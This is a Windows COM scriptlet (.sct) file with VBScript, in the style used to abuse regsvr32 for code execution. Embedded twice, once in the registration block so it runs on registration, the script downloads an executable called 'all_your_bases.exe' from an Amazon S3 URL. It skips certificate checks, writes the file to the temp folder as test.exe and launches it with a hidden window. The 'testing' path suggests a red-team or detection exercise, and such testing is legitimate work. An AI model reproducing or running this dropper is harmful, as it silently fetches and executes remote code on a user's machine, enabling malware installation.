<?XML version="1.0"?>
<scriptlet>

<registration
    description="RET Scriptlet"
    progid="RET Scriptlet"
    version="1.00"
    classid="{00000001-0000-0000-0000-DEADBEEFCAFE}"
	>
	
	<script language="VBScript">
		<![CDATA[
	
			Const adTypeBinary = 1
			Const adSaveCreateOverWrite = 2
			Dim http,ado
			Set http = CreateObject("Msxml2.ServerXMLHTTP.6.0")
			http.SetOption 2, 13056
			http.open "GET","http://amp-tg-ret.s3.amazonaws.com/testing/all_your_bases.exe",False
			http.send
			Set ado = createobject("Adodb.Stream")
			ado.Type = adTypeBinary
			ado.Open
			ado.Write http.responseBody
      Set wshShell = CreateObject( "WScript.Shell" )
      path = wshShell.ExpandEnvironmentStrings("%temp%\\test.exe")  
			ado.SaveToFile path
			ado.Close
			wshShell.Run path,0,false 
	
		]]>
</script>
</registration>

<public>
    <method name="Exec"></method>
</public>
	<script language="VBScript">
		<![CDATA[
	
			Const adTypeBinary = 1
			Const adSaveCreateOverWrite = 2
			Dim http,ado
			Set http = CreateObject("Msxml2.ServerXMLHTTP.6.0")
			http.SetOption 2, 13056
			http.open "GET","http://amp-tg-ret.s3.amazonaws.com/testing/all_your_bases.exe",False
			http.send
			Set ado = createobject("Adodb.Stream")
			ado.Type = adTypeBinary
			ado.Open
			ado.Write http.responseBody
      Set wshShell = CreateObject( "WScript.Shell" )
      path = wshShell.ExpandEnvironmentStrings("%temp%\\test.exe")  
			ado.SaveToFile path
			ado.Close
			wshShell.Run path,0,false 
	
		]]>
</script>

</scriptlet>
